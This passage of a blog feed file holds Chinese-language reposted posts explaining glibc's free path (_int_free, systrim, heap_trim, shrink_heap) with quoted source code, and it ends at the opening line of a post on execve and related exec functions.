class="hljs-function"><span class="hljs-title">vm_ops</span> &amp;&amp; vma-&gt;</span><span class="hljs-function"><span class="hljs-title">vm_ops</span>-&gt;</span>close)<br>        <span class="hljs-function"><span class="hljs-title">vma</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">vm_ops</span>-&gt;</span>close(vma);<br>    <span class="hljs-function"><span class="hljs-title">if</span> (vma-&gt;</span>vm_file)<br>        <span class="hljs-function"><span class="hljs-title">fput</span>(vma-&gt;</span>vm_file);<br>    mpol_put(vma_policy(vma));<br>    kmem_cache_free(vm_area_cachep, vma);<br>    return next;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>free源码分析——2</title>
    <link href="/2023/11/09/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/"/>
    <url>/2023/11/09/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/</url>
    
    <content type="html"><![CDATA[<h1 id="free源码分析—-int-free"><a href="#free源码分析—-int-free" class="headerlink" title="free源码分析—_int_free"></a>free源码分析—_int_free</h1><p>根据上一章的分析可知，如果一个chunk不是由mmap分配得到，就会调用<code>_int_free</code>进行释放。下面来看，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">__libc_free</span>(<span class="hljs-params"><span class="hljs-keyword">void</span> *mem</span>) &#123;<br><br>    ...<br><br>    p = <span class="hljs-title function_">mem2chunk</span>(mem);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">chunk_is_mmapped</span>(p))&#123;<br>        ...<br>    &#125;<br><br>    ar_ptr = <span class="hljs-title function_">arena_for_chunk</span>(p);<br>    <span class="hljs-title function_">_int_free</span>(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-free第一部分"><a href="#int-free第一部分" class="headerlink" title="_int_free第一部分"></a>_int_free第一部分</h2><p>首先来看<code>_int_free</code>第一部分，为了便于分析，这里省略了一些不关键的代码，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free(mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>    INTERNAL_SIZE_T size;<br>    mfastbinptr *fb;<br>    mchunkptr nextchunk;<br>    INTERNAL_SIZE_T nextsize;<br>    <span class="hljs-type">int</span> nextinuse;<br>    INTERNAL_SIZE_T prevsize;<br>    mchunkptr bck;<br>    mchunkptr fwd;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br>    size = <span class="hljs-built_in">chunksize</span>(p);<br><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !<span class="hljs-built_in">aligned_OK</span> (size))) &#123;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>    <span class="hljs-built_in">check_inuse_chunk</span>(av, p);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (<span class="hljs-built_in">get_max_fast</span> ())) &#123;<br><br>        <span class="hljs-built_in">free_perturb</span>(<span class="hljs-built_in">chunk2mem</span>(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-built_in">set_fastchunks</span>(av);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = <span class="hljs-built_in">fastbin_index</span>(size);<br>        fb = &amp;<span class="hljs-built_in">fastbin</span>(av, idx);<br><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = <span class="hljs-built_in">fastbin_index</span>(<span class="hljs-built_in">chunksize</span>(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = <span class="hljs-built_in">catomic_compare_and_exchange_val_rel</span>(fb, p, old2)) != old2);<br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>第一部分首先是检查<code>size</code>变量的合法性，然后比较<code>get_max_fast()</code>判断<code>size</code>是否在fastbin的范围内，如果在fastbin的管理范围内，就通过<code>set_fastchunks</code>设置分配区的标志位表示fastbin有空闲chunk，接下来根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code>，最后通过CAS操作将该chunk添加到fastbin中。这里需要注意fastbin中存放的chunk是按照单向链表组织的。</p><h2 id="int-free第二部分"><a href="#int-free第二部分" class="headerlink" title="_int_free第二部分"></a>_int_free第二部分</h2><p>继续往下看，为了使整个代码结构清晰，这里保留了上一部分的if，</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;<br><br>        ...<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br><br>        nextchunk = chunk_at_offset(p, size);<br>        nextsize = chunksize(nextchunk);<br><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>            <span class="hljs-function"><span class="hljs-title">prevsize</span> = p-&gt;</span>prev_size;<br>            size += prevsize;<br>            p = chunk_at_offset(p, -((long ) prevsize));<br>            unlink(av, p, bck, fwd);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-title">if</span> (nextchunk != av-&gt;</span>top) &#123;<br>            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>            <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                unlink(av, nextchunk, bck, fwd);<br>                size += nextsize;<br>            &#125; <span class="hljs-keyword">else</span><br>                clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>            bck = unsorted_chunks(av);<br>            <span class="hljs-function"><span class="hljs-title">fwd</span> = bck-&gt;</span>fd;<br>            <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely(fwd-&gt;</span>bk != bck)) &#123;<br>                errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>                goto errout;<br>            &#125;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd = fwd;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk = bck;<br>            <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd_nextsize = NULL;<br>                <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk_nextsize = NULL;<br>            &#125;<br>            <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = p;<br>            <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk = p;<br><br>            set_head(p, size | PREV_INUSE);<br>            set_foot(p, size);<br><br>            check_free_chunk(av, p);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            size += nextsize;<br>            set_head(p, size | PREV_INUSE);<br>            <span class="hljs-function"><span class="hljs-title">av</span>-&gt;</span>top = p;<br>            check_chunk(av, p);<br>        &#125;<br><br>        ...<br><br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>如果将要释放的chunk不属于fastbin，且不是由mmap分配的，就首先获得下一个chunk的指针<code>nextchunk</code>和大小<code>nextsize</code>，如果前一个chunk空闲，就和前一个chunk合并，并通过<code>unlink</code>将该chunk从空闲链表中脱离。接下来，如果刚才前面取出的下一个chunk也为空闲，并且该chunk不是top chunk，则继续合并，否则将其设为空闲。再往下，就是取出unsortedbin的头指针，将合并后的chunk插入unsortedbin链表头部，并进行相应的设置。<br>如果下一个chunk为top chunk，就将要释放的chunk合并到top chunk中。</p><h2 id="int-free第三部分"><a href="#int-free第三部分" class="headerlink" title="_int_free第三部分"></a>_int_free第三部分</h2><p>继续往下看，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free(mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (<span class="hljs-built_in">get_max_fast</span> ())) &#123;<br><br>        ...<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">chunk_is_mmapped</span>(p)) &#123;<br><br>        ...<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">have_fastchunks</span>(av))<br>                <span class="hljs-built_in">malloc_consolidate</span>(av);<br><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (<span class="hljs-built_in">chunksize</span>(av-&gt;top))<br>                        &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.trim_threshold))<br>                    <span class="hljs-built_in">systrim</span>(mp_.top_pad, av);<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                heap_info *heap = <span class="hljs-built_in">heap_for_ptr</span>(<span class="hljs-built_in">top</span>(av));<br>                <span class="hljs-built_in">heap_trim</span>(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            <span class="hljs-built_in">assert</span>(locked);<br>            (<span class="hljs-type">void</span>) <span class="hljs-built_in">mutex_unlock</span>(&amp;av-&gt;mutex);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">munmap_chunk</span>(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果前面释放的chunk比较大，就需要做一些处理了。首先对fastbin中的chunk进行合并并添加到unsortedbin中。然后，如果是主分配区，并且主分配区的top chunk大于一定的值，就通过<code>systrim</code>缩小top chunk。如果是非主分配区，就获得top chunk对应的非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>尝试缩小该heap。后面来看<code>systrim</code>和<code>heap_trim</code>这两个函数。<br>最后，说明chunk还是通过mmap分配的，就调用<code>munmap_chunk</code>释放它。<code>munmap_chunk</code>函数已经在上一章介绍了。</p><h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h2><p><code>systrim</code>用于缩小主分配区的top chunk大小，下面来看，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">systrim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pad, mstate av)</span> </span>&#123;<br>    <span class="hljs-type">long</span> top_size;<br>    <span class="hljs-type">long</span> extra;<br>    <span class="hljs-type">long</span> released;<br>    <span class="hljs-type">char</span> *current_brk;<br>    <span class="hljs-type">char</span> *new_brk;<br>    <span class="hljs-type">size_t</span> pagesize;<br>    <span class="hljs-type">long</span> top_area;<br><br>    pagesize = <span class="hljs-built_in">GLRO</span>(dl_pagesize);<br>    top_size = <span class="hljs-built_in">chunksize</span>(av-&gt;top);<br><br>    top_area = top_size - MINSIZE - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (top_area &lt;= pad)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    extra = (top_area - pad) &amp; ~(pagesize - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (extra == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    current_brk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MORECORE</span>(<span class="hljs-number">0</span>));<br>    <span class="hljs-keyword">if</span> (current_brk == (<span class="hljs-type">char</span> *) (av-&gt;top) + top_size) &#123;<br><br>        <span class="hljs-built_in">MORECORE</span>(-extra);<br>        <span class="hljs-built_in">void</span> (*hook)(<span class="hljs-type">void</span>) = <span class="hljs-built_in">atomic_forced_read</span> (__after_morecore_hook);<br>        <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        new_brk = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MORECORE</span>(<span class="hljs-number">0</span>));<br><br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_sbrk_less, <span class="hljs-number">2</span>, new_brk, extra);<br><br>        <span class="hljs-keyword">if</span> (new_brk != (<span class="hljs-type">char</span> *) MORECORE_FAILURE) &#123;<br>            released = (<span class="hljs-type">long</span>) (current_brk - new_brk);<br><br>            <span class="hljs-keyword">if</span> (released != <span class="hljs-number">0</span>) &#123;<br>                av-&gt;system_mem -= released;<br>                <span class="hljs-built_in">set_head</span>(av-&gt;top, (top_size - released) | PREV_INUSE);<br>                <span class="hljs-built_in">check_malloc_state</span> (av);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先，如果主分配区的top chunk本来就没什么空间，就直接返回，否则就将主分配区中可以缩小的大小保存在<code>extra</code>中。下面检查当前堆的<code>brk</code>指针是否和top chunk的结束地址相等，如果相等就可以通过<code>MORECORE</code>降低堆的大小，<code>MORECORE</code>是brk的系统调用，最后也是通过<code>do_munmap</code>释放虚拟内存的。<code>__after_morecore_hook</code>函数指针为空，不管它。再下来，获得释放后的堆指针保存在<code>new_brk</code>中，计算释放的虚拟内存的大小<code>released</code>，并将该信息更新到主分配区中，然后设置新top chunk的<code>size</code>。</p><h2 id="heap-trim"><a href="#heap-trim" class="headerlink" title="heap_trim"></a>heap_trim</h2><p><code>heap_trim</code>用来缩小非主分配区的heap大小，下面来看，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>internal_function heap_trim(heap_info *heap, size_t pad) &#123;<br>    mstate ar_ptr = heap-&gt;ar_ptr;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> pagesz = GLRO(dl_pagesize);<br>    mchunkptr top_chunk = top(ar_ptr), p, bck, fwd;<br>    heap_info *prev_heap;<br>    <span class="hljs-keyword">long</span> new_size, top_size, top_area, extra, prev_size, misalign;<br><br>    <span class="hljs-keyword">while</span> (top_chunk == chunk_at_offset(heap, sizeof(*heap))) &#123;<br>        prev_heap = heap-&gt;prev;<br>        prev_size = prev_heap-&gt;size - (MINSIZE - <span class="hljs-number">2</span> * SIZE_SZ);<br>        p = chunk_at_offset(prev_heap, prev_size);<br>        misalign = ((<span class="hljs-keyword">long</span>) p) &amp; MALLOC_ALIGN_MASK;<br>        p = chunk_at_offset(prev_heap, prev_size - misalign);<br>        p = prev_chunk(p);<br>        new_size = chunksize(p) + (MINSIZE - <span class="hljs-number">2</span> * SIZE_SZ) + misalign;<br>        <span class="hljs-keyword">if</span> (!prev_inuse(p))<br>            new_size += p-&gt;prev_size;<br>        <span class="hljs-keyword">if</span> (new_size + (HEAP_MAX_SIZE - prev_heap-&gt;size)<br>                &lt; pad + MINSIZE + pagesz)<br>            <span class="hljs-keyword">break</span>;<br>        ar_ptr-&gt;system_mem -= heap-&gt;size;<br>        arena_mem -= heap-&gt;size;<br>        delete_heap(heap);<br>        heap = prev_heap;<br>        <span class="hljs-keyword">if</span> (!prev_inuse(p))&#123;<br>            p = prev_chunk(p);<br>            unlink(ar_ptr, p, bck, fwd);<br>        &#125;<br>        top (ar_ptr) = top_chunk = p;<br>        set_head(top_chunk, new_size | PREV_INUSE);<br>    &#125;<br><br>    top_size = chunksize(top_chunk);<br>    top_area = top_size - MINSIZE - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (top_area &lt; <span class="hljs-number">0</span> || (size_t) top_area &lt;= pad)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    extra = ALIGN_DOWN(top_area - pad, pagesz);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) extra &lt; mp_.trim_threshold)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (shrink_heap(heap, extra) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    ar_ptr-&gt;system_mem -= extra;<br>    arena_mem -= extra;<br><br>    set_head(top_chunk, (top_size - extra) | PREV_INUSE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个while表示，如果top chunk指针正好在<code>heap_info</code>上，则考虑删掉整个heap。这是因为此时，该heap只有一个top chunk。再删掉该heap之前，需要检查该heap的前一个heap是否有足够的空间，否则删掉该heap后，剩余的空间太小。<br>经过计算后，<code>newsize</code>保存了前一个heap高地址处的fencepost和前一个空闲chunk（如果存在）的总大小组成，如果<code>newsize</code>加上该heap还未使用的内存（<code>HEAP_MAX_SIZE - prev_heap-&gt;size</code>）太小，就<code>break</code>退出循环，取消对整个heap的释放。否则，在更新了相应的信息后，调用<code>delete_heap</code>删除整个heap，<code>delete_heap</code>是一个宏，定义如下</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define delete_heap(heap) \</span><br>  <span class="hljs-keyword">do</span> &#123;                                        <span class="hljs-string">\</span><br>      <span class="hljs-keyword">if</span> ((char *) (heap) + HEAP_MAX_SIZE == aligned_heap_area)           <span class="hljs-string">\</span><br>        aligned_heap_area = NULL;                         <span class="hljs-string">\</span><br>      __munmap ((char *) (heap), HEAP_MAX_SIZE);                  <span class="hljs-string">\</span><br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><code>delete_heap</code>其最终通过<code>__munmap</code>释放整个heap，大小为<code>HEAP_MAX_SIZE</code>。<br>删除掉整个heap后，如果前一个heap的fencepost的前面有一个空闲chunk，就将该空闲chunk从空闲链表中脱离，然后设置fencepost或者该空闲chunk（如果存在）的地址为新的top chunk，该top chunk的大小为前面计算的<code>new_size</code>。<br>然后返回<code>while</code>继续检查，如果新的top chunk指针又正好在<code>heap_info</code>上，就表示该heap也就只有一个chunk即top chunk，就继续释放该heap。<br>再往下，如果新的top chunk剩余空间<code>top_area</code>太小，就直接返回了。如果还有足够的空间，且<code>top_area</code>大于收缩阀值，就调用<code>shrink_heap</code>进一步将新的top chunk的大小减少<code>extra</code>。最后设置一些分配区的信息，并设置减少后的top chunk的大小为<code>top_size - extra</code>。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">shrink_heap</span><span class="hljs-params">(heap_info *h, <span class="hljs-type">long</span> diff)</span> </span>&#123;<br>    <span class="hljs-type">long</span> new_size;<br><br>    new_size = (<span class="hljs-type">long</span>) h-&gt;size - diff;<br>    <span class="hljs-keyword">if</span> (new_size &lt; (<span class="hljs-type">long</span>) <span class="hljs-built_in">sizeof</span>(*h))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    h-&gt;size = new_size;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里其实就是减小<code>heap_info</code>的<code>size</code>变量。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面对整个<code>_int_free</code>函数做个总结。<br>首先检查将要释放的chunk是否属于fastbin，如果属于就将其添加到fastbin中。<br>然后检查该chunk是否是由mmap分配的，如果不是，就根据其下一个chunk的类型添加到unsortedbin或者合并到top chunk中。<br>接着，如果释放的chunk的大小大于一定的阀值，就需要通过<code>systrim</code>缩小主分配区的大小，或者通过<code>heap_trim</code>缩小非主分配区的大小。<br>最后如果该chunk是由mmap的分配的，通过<code>munmap_chunk</code>释放。</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下system()/execve()/execl()函数使用详解</title>
    <link href="/2023/11/09/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/11/09/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>本节详细可参考<br><a href="http://www.cnblogs.com/akira90/archive/2012/12/05/2802809.html">http://www.cnblogs.com/akira90/archive/2012/12/05/2802809.html</a></p><h3 id="1-execve函数"><a href="#1-execve函数" class="headerlink" title="1. execve函数"></a>1. execve函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> 相关函数： fork，execl，execle，execlp，execv，execvp<br><br> 